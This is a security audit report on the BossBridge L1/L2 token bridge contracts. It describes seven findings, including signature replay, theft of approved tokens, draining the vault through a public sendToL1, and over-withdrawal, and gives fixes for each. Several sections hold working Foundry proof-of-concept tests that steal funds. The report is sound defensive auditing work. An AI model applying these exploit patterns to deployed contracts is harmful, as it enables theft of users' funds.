# BossBridge_Audit_Report

## H-01.The funds stored in the Vault may exceed the limit

### Summary

Since the ` depositTokensToL2() ` function uses its own balance to check whether the limit is exceeded, this can cause the total amount to exceed the limit if multiple users are depositing funds simultaneously.



### Vulnerability Details

The vulnerability is located in the ` depositTokensToL2() ` function of the ` L1BossBridge.sol ` file.

```solidity
function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
    ...
    if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
        revert L1BossBridge__DepositLimitReached();
    }
    ...
}
```

For example, if the balance of the Vault is currently ` DEPOSIT_LIMIT - 1 `, and both ` user1 ` and ` user2 ` call the function simultaneously to deposit 1 ether of tokens, the balance in the Vault contract might become ` DEPOSIT_LIMIT + 1 `.



### Proof of Concept

#### Test Case

```solidity
function testConcurrentDeposit() public {
    // vault.balance = tokenBridge.DEPOSIT_LIMIT() - 1 ether
    deal(address(token), address(vault), tokenBridge.DEPOSIT_LIMIT() - 1 ether);
    address user2 = makeAddr("user2");
    address user2InL2 = makeAddr("user2InL2");
    deal(address(token), address(user2), 1 ether);
    
    // user deposit 1 ether
    vm.startPrank(user);
    token.approve(address(tokenBridge), 1 ether);
    tokenBridge.depositTokensToL2(user, userInL2, 1 ether);
    vm.stopPrank();
    
    // user2 deposit 1 ether
    vm.startPrank(user2);
    token.approve(address(tokenBridge), 1 ether);
    vm.expectRevert(L1BossBridge.L1BossBridge__DepositLimitReached.selector);
    tokenBridge.depositTokensToL2(user2, user2InL2, 1 ether);
    vm.stopPrank();
}
```

#### Output

```bash
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.14ms (4.13ms CPU time)

Ran 1 test suite in 14.83ms (7.14ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```



### Impact

If multiple transactions execute nearly simultaneously and surpass the deposit limit, it could  lead to unexpected behavior or potential vulnerabilities in the token bridge between L1 and L2.



### Recommendation

Use a mapping to track the balance.



## H-02.The withdraw function is susceptible tp replay attacks

### Summary

The ` withdrawTokensToL1 ` and ` sendToL1 ` function is susceptible to replay attacks due to the absence of a nonce verification mechanism. The attacker can exploit this vulnerability to repeatedly withdraw tokens using the same signature, leading to the loss of funds.



### Vulnerability Details

The vulnerability is located in the ` withdrawTokensToL1 ` and ` sendToL1 ` function of the ` L1BossBridge.sol ` file.

```solidity
function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
    ...
}

function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
    ...
}
```

The two functions allows users with valid signatures to withdraw from L2 to L1.

However, since they lack a nonce to mark the number of times the action has been performed, they can be exploited by attackers to conduct replay attacks.



### Proof of Concept

#### Test Case

```solidity
function testReplayAttack() public {
    // user deposit to L2 10 ether
    vm.startPrank(user);
    token.approve(address(tokenBridge), 10 ether);
    tokenBridge.depositTokensToL2(user, userInL2, 10 ether);
    vm.stopPrank();

    // The operator sign the withdraw action
    address attacker = makeAddr("attacker");
    bytes memory message = _getTokenWithdrawalMessage(attacker, 1 ether);
    (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);

    // attacker replay the withdraw actions
    vm.startPrank(attacker);
    tokenBridge.withdrawTokensToL1(attacker, 1 ether, v, r, s);
    tokenBridge.withdrawTokensToL1(attacker, 1 ether, v, r, s);
    tokenBridge.withdrawTokensToL1(attacker, 1 ether, v, r, s);
    tokenBridge.withdrawTokensToL1(attacker, 1 ether, v, r, s);
    tokenBridge.withdrawTokensToL1(attacker, 1 ether, v, r, s);
    vm.stopPrank();

    assertEq(token.balanceOf(attacker), 5 ether);
    assertEq(token.balanceOf(address(vault)), 5 ether);
}
```

#### Output

```bash
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 17.99ms (3.91ms CPU time)

Ran 1 test suite in 32.14ms (17.99ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```



### Impact

This vulnerability can lead to the loss of funds.



### Recommendation

Introduce a nonce parameter in the function signature and maintain a nonce registry for each signer. Ensure that the provided nonce is greater than the previously used nonce for the same signer.

Also, to prevent the same signature from being used between ` L1 ` and ` L2 `, it is recommended to add the ` chainId ` parameter within the signature.

```solidity
mapping(address signer => uint256 nonce) public sign_nonce;

// function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external nonReentrant whenNotPaused {
    // add
    sign_nonce[to]++;
    sendToL1(
        v,
        r,
        s,
        abi.encode(
            address(token),
            0,
            abi.encodeCall(IERC20.transferFrom, (address(vault), to, amount)),
            chainId, // add chain id
            sign_nonce[to] // add nonce
        )
    );
}

// function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) internal nonReentrant whenNotPaused {
    address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(keccak256(message)), v, r, s);

    if (!signers[signer]) {
        revert L1BossBridge__Unauthorized();
    }
    (address target, uint256 value, bytes memory data) = abi.decode(message, (address, uint256, bytes));
    (bool success,) = target.call{ value: value }(data);
    if (!success) {
        revert L1BossBridge__CallFailed();
    }
}
```



## H-03.CREATE is not available in the Zksync

### Summary

The ` CREATE ` instruction can not be used in ` Zksync `, as it will lead to a revert.



### Vulnerability Details

The vulnerability is located in the ` deployToken() ` function of the ` TokenFactory.sol ` file.

```solidity
function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr) {
    ...
    assembly {
        addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
    }
    ...
}
```

Since the ` TokenFactory ` contract need to be deployed on ` Zksync `, and the ` Zksync ` [official documentation](https://docs.zksync.io/zksync-protocol/differences/evm-instructions) has already stated that the ` CREATE ` instruction can not be used.

> For instance, the following code will never work because ZKsync Era contracts cannot be deployed using any kind of bytecode:
>
> ```solidity
> function myFactory(bytes memory bytecode) public {
> assembly {
>    addr := create(0, add(bytecode, 0x20), mload(bytecode))
> }
> }
> 
> ```



### Impact

Protocol will not work on ` ZkSync `.



### Recommendation

Just follow the official documentation to make the necessary changes.

> The code below always works as expected:
>
> ```solidity
> MyContract a = new MyContract();
> MyContract a = new MyContract{salt: ...}();
> ```
>
> However, using `create`/`create2` in assembly blocks is unsafe, because the compiler will most likely silently produce broken bytecode, leading to security vulnerabilities and unreachable code. Some common libraries such as `openzeppelin-contracts` or `forge-std` may include the following pattern:
>
> ```solidity
> /// The `bytecode` is not bytecode here, but a header passed to `ContractDeployer`.
> bytes memory bytecode = type(MyContract).creationCode;
> assembly {
>  addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
> }
> ```
>
> This specific pattern has been tested and must work correctly, but any variation of it will fail due to unsatisfied EraVM assumptions. Newer versions of `zksolc` do not recommend using `create`/`create2` in assembly and produce a warning. The warning could not be made an error as common libraries that use this feature cannot be easily changed by smart contract developers.

```solidity
function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr) {
    ...
    /*
    assembly {
        addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
    }
    */
    assembly {
    addr := create2(0, add(contractBytecode, 0x20), mload(contractBytecode), salt)
    }
    ...
}
```



## H-04.Attacker can steal funds of any token approved to L1BossBridge

### Summary

Attacker can exploit the ` depositTokensToL2() ` function by crafting malicious parameters to deposit other user's tokens to L2 and then withdraw them for themselves.



### Vulnerability Details

The vulnerability is located in the ` depositTokensToL2() ` function of the ` L1BossBridge.sol ` file.

```solidity
function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
    ...
    token.safeTransferFrom(from, address(vault), amount);

    emit Deposit(from, l2Recipient, amount);
}
```

Users need to fill in the ` from `, ` l2Recipient `, ` amount ` parameters to call the function. The transfer is executed via ` token.safeTransferFrom `, and the ` to ` parameter is a fixed address(Vault). Upon sucessful transfer, the ` Deposit ` event is emitted, and tokens are minted for the ` l2Recipient ` on L2.

If an attacker knows that a user has just approved some tokens to ` L1BossBridge `, they can craft the parameters as ` depositTokensToL2(userAddress, attackerL2Address, amount) `. This way, the user's funds will be deposited into the attacker's L2 address. The attacker can then use the ` withdrawTokensToL1() ` function to retrieve the tokens back to L1.



### Proof of Concept

#### Test Case

```solidity
function testStealOtherUserFunds() public {
    // user approve 10 ether tokens
    vm.prank(user);
    token.approve(address(tokenBridge), 1000 ether);

    // attacker use the tokens
    address attacker = makeAddr("attacker");
    address attackerInL2 = makeAddr("attackerInL2");
    vm.startPrank(attacker);
    tokenBridge.depositTokensToL2(user, attackerInL2, 1000 ether);
    vm.stopPrank();

    assertEq(token.balanceOf(user), 0 ether);
    assertEq(token.balanceOf(address(vault)), 1000 ether);
}
```

#### Output

```bash
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.55ms (280.79µs CPU time)

Ran 1 test suite in 202.29ms (2.55ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Impact

The users who approved the tokens will suffer the loss of funds.



### Recommendation

Remove the ` from ` parameter and replace the following parameter with ` msg.sender `.

```solidity
function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
    ...
    // token.safeTransferFrom(from, address(vault), amount);
    // modify
    token.safeTransferFrom(msg.sender, address(vault), amount);

    emit Deposit(from, l2Recipient, amount);
}
```



## H-05.Anyone can steal all funds from the Valut

### Summary

The attacker can specify the ` message ` parameter from the ` sendToL1() ` function that steal all the funds from the valut.



### Vulnerability Details

The vulnerability is located in the ` sendToL1() ` function of the ` L1BossBridge.sol ` file.

```solidity
function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
    address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(keccak256(message)), v, r, s);
    if (!signers[signer]) {
        revert L1BossBridge__Unauthorized();
    }
    (address target, uint256 value, bytes memory data) = abi.decode(message, (address, uint256, bytes));
    (bool success,) = target.call{ value: value }(data);
    if (!success) {
        revert L1BossBridge__CallFailed();
    }
}
```

Because the function has a state visibility ` public `, that meaning anyone can call it with an arbitrary value for the ` message `  parameter. So an attacker can specify the ` target ` to an valut, and since the ` msg.sender ` is the ` L1BossBridge ` which is the owner of the valut, it can call the ` approveTo ` function to approve attacker's address be able to get all the funds from the valut.



### Proof of Concept

#### Test Case

```solidity
function testStealAllFundsFromValut() public {
    // user deposit the funds
    vm.startPrank(user);
    token.approve(address(tokenBridge), 1000 ether);
    tokenBridge.depositTokensToL2(user, userInL2, 1000 ether);
    vm.stopPrank();

    assertEq(token.balanceOf(address(vault)), 1000 ether);

    address attacker = makeAddr("attacker");
    // L1BossBridge call the vault.approveTo(attacker, type(uint256).max)
    bytes memory attacker_message = abi.encode(address(vault), 0, abi.encodeCall(L1Vault.approveTo, (address(attacker), type(uint256).max)));
    (uint8 v, bytes32 r, bytes32 s) = _signMessage(attacker_message, operator.key);
    vm.startPrank(attacker);
    // attack
    tokenBridge.sendToL1(v, r, s, attacker_message);
    // withdraw
    token.transferFrom(address(vault), attacker, 1000 ether);
    vm.stopPrank();

    assertEq(token.balanceOf(address(vault)), 0 ether);
    assertEq(token.balanceOf(attacker), 1000 ether);
}
```

#### Output

```bash
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.08ms (2.78ms CPU time)

Ran 1 test suite in 202.06ms (5.08ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Impact

Anyone can force their approval to withdraw the entire vault balance.

### Recommendation

Set the ` sendToL1() ` function visibility to ` private ` to ensure that it can be only called by ` withdrawTokensToL1() ` function.

Or restrict the calldata to the specific function selectors.



## H-06.Attacker can withdraw more funds than deposited

### Summary

Since the ` withdrawTokensToL1() ` function does not check the ` amount `, an attacker can deposit a small amount of funds into L2 through ` depositTokensToL2() ` , and then withdraw all funds from L2.



### Vulnerability Details

The vulnerability is located in ` withdrawTokensToL1() ` function of the ` L1BossBridge.sol ` file.

We can take a look at the contract's description under ` On withdrawals `:

> Our service will validate the payloads submitted by users, **checking that the account submitting the withdrawal has first originated a successful deposit in the L1 part of the bridge**.

The operator only checks whether the user has a valid deposit, but does not check the amounts of the deposit and withdraw.

So the attacker can deposit a small amount funds into L2 through ` depositTokensToL2() ` function, and then withdraw all funds from L2 through ` withdrawTokensToL1() ` function.



### Proof of Concept

#### Test Case

```solidity
function testWithdrawAllFunds() public {
    // user deposit the funds
    vm.startPrank(user);
    token.approve(address(tokenBridge), 1000 ether);
    tokenBridge.depositTokensToL2(user, userInL2, 1000 ether);
    vm.stopPrank();

    address attacker = makeAddr("attacker");
    address attackerInL2 = makeAddr("attackerInL2");
    deal(address(token), attacker, 1 ether);
    vm.startPrank(attacker);
    token.approve(address(tokenBridge), 1 ether);
    tokenBridge.depositTokensToL2(attacker, attackerInL2, 1 ether);
    bytes memory attacker_message = abi.encode(
        address(token),
        0,
        abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, 1001 ether))
    );
    vm.stopPrank();

    (uint8 v, bytes32 r, bytes32 s) = _signMessage(attacker_message, operator.key);
    vm.prank(attacker);
    tokenBridge.withdrawTokensToL1(attacker, 1001 ether, v, r, s);

    assertEq(token.balanceOf(attacker), 1001 ether);
}
```

#### Output

```bash
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.19ms (1.07ms CPU time)

Ran 1 test suite in 120.07ms (7.19ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Impact

This vulnerability can lead to the loss of funds.



### Recommendation

Add a mapping that keeps track of the amount deposited by an address inside the function `depositTokensToL2()`, and validate that inside `withdrawTokensToL1()`.



## H-07.Deploying L1Token via TokenFactory will permanently lock the token

### Summary

Deploying ` L1Token ` via ` TokenFactory ` will permanently lock the token.



### Vulnerability Details

When ` TokenFactory ` deploys ` L1Token `, L1Token will mint some tokens to ` msg.sender `, which in this case is ` TokenFactory `.However, since ` TokenFactory ` does not have any transfer-related operations, the token will be permanently locked within it.



### Impact

Using this token factory to deploy tokens will result in unusable tokens, and no transfers can be made.



### Recommendation

Consider passing a receiver address for the initial minted tokens:

```solidity
contract L1Token is ERC20 {
    uint256 private constant INITIAL_SUPPLY = 1_000_000;

    // constructor() ERC20("BossBridgeToken", "BBT") {
    //     _mint(msg.sender, INITIAL_SUPPLY * 10 ** decimals());
    // }
    constructor(address receiver) ERC20("BossBridgeToken", "BBT") {
        _mint(receiver, INITIAL_SUPPLY * 10 ** decimals());
    }
}
```

